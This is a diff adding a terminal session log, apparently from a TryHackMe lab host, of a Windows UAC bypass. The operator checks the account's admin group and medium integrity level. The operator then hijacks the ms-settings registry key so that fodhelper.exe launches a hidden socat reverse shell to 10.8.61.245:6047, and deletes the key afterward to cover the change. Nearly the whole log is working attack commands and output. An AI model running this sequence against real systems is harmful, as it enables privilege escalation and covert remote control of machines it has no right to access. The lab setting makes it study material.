@@ -1,0 +1,42 @@
+Script started on 2025-03-23 17:17:32+03:00 [COMMAND="rlwrap nc bypass.uac.thm 9999" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004h[KMicrosoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mwhoami[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami
+[Kmyserver\attacker
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mnet user attacker | find "Local Group"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnet user attacker | find "Local Group"
+[Knet user attacker | find "Local Group"
+[KLocal Group Memberships      *Administrators       *Users                
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mwhoami /groups | find "Label"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami /groups | find "Label"
+[Kwhoami /groups | find "Label"
+[KMandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mset REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hset REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+[Kset REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+[K
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mset CMD="powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.8.61.245:604[27m[7m7[27m[7m EXEC:cmd.exe,pipes"[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hset CMD="powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.8.61.245:6047 EXEC:cmd.exe,pipes"
+[Kset CMD="powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.8.61.245:6047 EXEC:cmd.exe,pipes"
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mreg add %REG_KEY% /v "DelegateExecute" /d "" /f[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg add %REG_KEY% /v "DelegateExecute" /d "" /f
+[Kreg add %REG_KEY% /v "DelegateExecute" /d "" /f
+[KThe operation completed successfully.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mreg add %REG_KEY% /d %CMD% /f[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg add %REG_KEY% /d %CMD% /f
+[Kreg add %REG_KEY% /d %CMD% /f
+The operation completed successfully.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mfodhelper.exe[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfodhelper.exe
+[Kfodhelper.exe
+[K
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mreg delete HKCU\Software\Classes\ms-settings\ /f[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg delete HKCU\Software\Classes\ms-settings\ /f
+[Kreg delete HKCU\Software\Classes\ms-settings\ /f
+The operation completed successfully.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K[?2004l
+Script done on 2025-03-23 17:19:14+03:00 [COMMAND_EXIT_CODE="0"]
